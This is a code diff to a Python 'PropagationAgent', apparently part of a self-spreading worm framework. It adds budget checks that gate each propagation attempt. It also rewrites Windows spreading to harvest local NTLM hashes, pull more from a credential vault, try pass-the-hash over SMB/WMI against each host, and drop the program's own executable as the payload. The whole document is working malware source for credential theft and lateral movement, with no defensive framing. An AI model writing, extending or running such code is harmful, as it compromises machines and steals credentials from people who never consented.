@@ -5,9 +5,17 @@ from typing import List, Optional, Deque, Dict, Any
 from collections import deque
 
 
-import paramiko
-from paramiko.client import SSHClient, AutoAddPolicy
-from paramiko import ssh_exception
+try:
+    import paramiko
+    from paramiko.client import SSHClient, AutoAddPolicy
+    from paramiko import ssh_exception
+    PARAMIKO_AVAILABLE = True
+except ImportError:
+    paramiko = None  # type: ignore
+    SSHClient = None  # type: ignore
+    AutoAddPolicy = None  # type: ignore
+    ssh_exception = None  # type: ignore
+    PARAMIKO_AVAILABLE = False
 
 # Phase 2 Integration: Import Windows propagation components
 try:
@@ -310,7 +318,19 @@ class PropagationAgent(BaseAgent):
                 
                 if target_ip:
                     log.info(f"Processing CPU-triggered mission to {target_ip} (trust: {trust_score:.2f})")
-                    self._deduct_propagation_cost()
+                    # ── ECONOMIC GATE (CPU-triggered path) ──────────────────
+                    if hasattr(self, 'accountant') and self.accountant:
+                        from decimal import Decimal
+                        approved, reason = self.accountant.process_agent_spend(
+                            str(self.agent_id), Decimal('0.4'),
+                            f"CPU-triggered propagation to {target_ip}"
+                        )
+                        if not approved:
+                            log.warning(
+                                f"[💸] CPU-triggered propagation to {target_ip} BLOCKED: {reason}"
+                            )
+                            return
+                    # ── END ECONOMIC GATE ────────────────────────────────────
                     try:
                         if self._reachable(target_ip):
                             self._propagate(target_ip)
@@ -325,7 +345,22 @@ class PropagationAgent(BaseAgent):
         
         # Regular propagation to configured hosts
         for host in self.hosts:
-            self._deduct_propagation_cost()
+            # ── ECONOMIC GATE ───────────────────────────────────────────────
+            # Check budget before attempting propagation to each host.
+            # _deduct_propagation_cost() is now a gate, not just a log entry.
+            if hasattr(self, 'accountant') and self.accountant:
+                from decimal import Decimal
+                PROP_COST = Decimal('0.4')
+                approved, reason = self.accountant.process_agent_spend(
+                    str(self.agent_id), PROP_COST,
+                    f"Propagation attempt to {host}"
+                )
+                if not approved:
+                    log.warning(
+                        f"[💸] Propagation to {host} SKIPPED — insufficient ROOT: {reason}"
+                    )
+                    continue
+            # ── END ECONOMIC GATE ────────────────────────────────────────────
             try:
                 if self._reachable(host):
                     self._propagate(host)
@@ -510,70 +545,96 @@ class PropagationAgent(BaseAgent):
     
     # ------------------------------------------------------------------
     def _propagate_windows(self, host: str) -> bool:
-        """Windows propagation via SMB/WMI with credential harvesting"""
+        """Windows propagation via SMB/WMI with credential harvesting & BlackVault credential store"""
         if not self.windows_engine:
             log.warning("❌ Windows propagation not available (module not loaded)")
             return False
         
         try:
-            # Step 1: Harvest credentials for PTH
-            credentials = None
-            if self.credential_harvester:
-                log.info("🔐 Harvesting credentials for Pass-the-Hash...")
-                credentials = self.credential_harvester.harvest_all()
-                if credentials:
-                    log.info(f"✅ Harvested {len(credentials)} credential(s)")
+            from windows_propagation import SMBTarget, NTLMCredential
             
-            # Step 2: Attempt SMB/WMI propagation
-            log.info("📤 Attempting Windows SMB/WMI propagation to %s...", host)
+            # Step 1: Harvest credentials locally + retrieve from BlackVault
+            ntlm_creds: List[NTLMCredential] = []
+            
+            # Local harvesting
+            if self.credential_harvester:
+                log.info("🔐 Harvesting local credentials for Pass-the-Hash...")
+                try:
+                    harvested = self.credential_harvester.harvest_all()
+                    for c in (harvested or []):
+                        val = c.credential_value if getattr(c, 'credential_type', '') == "NTLM_HASH" else getattr(c, 'credential_value', '')
+                        if val and len(val) == 32:
+                            ntlm_creds.append(NTLMCredential(
+                                domain=getattr(c, 'domain', '') or "WORKGROUP",
+                                username=c.username,
+                                ntlm_hash=val,
+                                source=getattr(c, 'source_method', 'harvester'),
+                                privilege_level=getattr(c, 'privilege_level', 'user').lower(),
+                                confidence=getattr(c, 'confidence', 0.8)
+                            ))
+                    if ntlm_creds:
+                        log.info(f"✅ Harvested {len(ntlm_creds)} NTLM credential(s)")
+                except Exception as h_err:
+                    log.warning(f"⚠️  Local credential harvesting error: {h_err}")
+            
+            # Vault retrieval
+            try:
+                vault_instance = getattr(getattr(self, 'kernel', None), 'vault', None)
+                v_creds = self.windows_engine.retrieve_credentials_from_vault(vault=vault_instance)
+                for vc in v_creds:
+                    if not any(c.ntlm_hash == vc.ntlm_hash and c.username == vc.username for c in ntlm_creds):
+                        ntlm_creds.append(vc)
+                log.info(f"🔑 Total credentials available for propagation: {len(ntlm_creds)}")
+            except Exception as v_err:
+                log.debug(f"Vault credential sync failed: {v_err}")
+            
+            # Step 2: Construct target profile
+            target = SMBTarget(
+                hostname=host,
+                ip=host,
+                port=445,
+                os_version="Windows", 
+                smb_enabled=True,
+                wmi_enabled=True,
+                last_seen=datetime.utcnow().isoformat(),
+                services=['SMB'],
+                score=60.0
+            )
+            
+            # Step 3: Determine payload path to stage
+            payload_to_drop = str(self.spawn_path) if hasattr(self, 'spawn_path') and os.path.exists(str(self.spawn_path)) else None
+            if not payload_to_drop:
+                cand = os.path.abspath(sys.argv[0])
+                if os.path.exists(cand):
+                    payload_to_drop = cand
+            
+            # Step 4: Attempt Pass-the-Hash propagation with available credentials
+            log.info(f"📤 Attempting Windows SMB/WMI propagation to {host} (payload: {payload_to_drop})...")
             success = False
             
-            try:
-                # Use credentials for SMB propagation with Pass-the-Hash
-                if credentials and len(credentials) > 0:
-                    log.info("🔐 Using harvested credentials for SMB propagation")
-                    # Construct SMBTarget from host
-                    from windows_propagation import SMBTarget, NTLMCredential
-                    target = SMBTarget(
-                        hostname=host,
-                        ip=host,
-                        port=445,
-                        os_version="Windows", 
-                        smb_enabled=True,
-                        wmi_enabled=True,
-                        last_seen=datetime.utcnow().isoformat(),
-                        services=[],
-                        score=50.0
-                    )
-                    
-                    # Convert ExtractedCredential to NTLMCredential
-                    first_cred = credentials[0]
-                    ntlm_cred = NTLMCredential(
-                        domain=first_cred.domain or "WORKGROUP",
-                        username=first_cred.username,
-                        ntlm_hash=first_cred.credential_value if first_cred.credential_type == "NTLM_HASH" else "",
-                        source=first_cred.source_method,
-                        privilege_level=first_cred.privilege_level.lower(),
-                        confidence=first_cred.confidence
-                    )
-                    
-                    # Call windows_engine.propagate_pth() with target and credential
+            if ntlm_creds:
+                for cred in ntlm_creds:
+                    log.info(f"🔐 Attempting PTH to {host} with user {cred.domain}\\{cred.username}")
                     success = self.windows_engine.propagate_pth(
                         target=target,
-                        credential=ntlm_cred
+                        credential=cred,
+                        payload_path=payload_to_drop
                     )
-                else:
-                    log.warning("⚠️  No credentials for SMB, attempting anonymous")
-                    success = False
-            except Exception as e:
-                log.error("❌ SMB propagation failed: %s", e)
-                success = False
+                    if success:
+                        log.info(f"✅ Windows PTH propagation succeeded on {host} using {cred.username}")
+                        break
+            else:
+                log.warning(f"⚠️  No NTLM credentials available for {host}; PTH skipped")
             
             if success:
-                log.info("✅ Windows propagation successful to %s", host)
+                self._emit_event(Event(
+                    event_type="windows_propagated",
+                    payload={"host": host, "target_os": "windows"},
+                    sender_id=str(self.agent_id)
+                ))
                 return True
             else:
-                log.warning("⚠️  Windows SMB propagation failed to %s", host)
+                log.warning("⚠️  Windows SMB/WMI propagation failed to %s", host)
                 return False
                 
         except Exception as e:
